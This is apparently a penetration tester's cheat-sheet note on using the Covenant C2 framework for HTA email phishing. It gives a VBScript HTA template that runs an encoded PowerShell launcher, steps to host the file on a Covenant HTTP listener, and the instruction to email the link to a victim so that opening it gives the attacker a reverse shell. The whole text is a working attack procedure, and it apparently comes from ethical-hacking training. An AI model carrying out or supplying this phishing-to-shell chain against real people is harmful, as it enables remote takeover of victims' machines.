# Covenant

## hta Email Phishing

- Create and hta file in your attacking machine:

```
<script language="VBScript">
  Function DoStuff()
    Dim wsh
    Set wsh = CreateObject("Wscript.Shell")
    wsh.run "<powershell command here>"
    Set wsh = Nothing
  End Function

  DoStuff
  self.close
</script>
```

- Create an HTTP listener in Covenant
  - Listerner > create 
  - The table in listener should look like this  
    | Name        |    ListenerType | Status | StartTime	    |        ConnectAddresses   |   ConnectPort|
    |-------------|-----------------|--------|----------------|---------------------------|--------------|
    |HTTP Listener |	HTTP 	        |Active 	|3/7/2022 8:28:13 PM |	IP-OF-ATTACK-MACHINE 	    | 80

  - Go to Launchers > Powershell
  - Fill up the info
  - Click on generate
  - Copy the encoded Launcher and put it in the script above instead of `<powershell command here>` 
  - Save the script
  - Go back to Listerners click on the listener that was just set up 
  - Go to Hosted Files, in Path enter `/name-of-your-script.hta`
  - Click on Browse and select your script
  - And click on create
  - If we go to `http://localhost/name-of-your-script.hta` we should be able to download it
- We can now send an email with a link to our reverse shell `http://IP-OF-ATTACK-MACHINE/name-of-your-script.hta`
- When the user will click the link an run the script we will get our reverse shell
- If we go to Covenant again and check in Grunt we should have a new one

## Resources

- [Get Covenant here](https://github.com/cobbr/Covenant)
- [Movement Pivoting and Persistence - TCM Security Academy](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers)
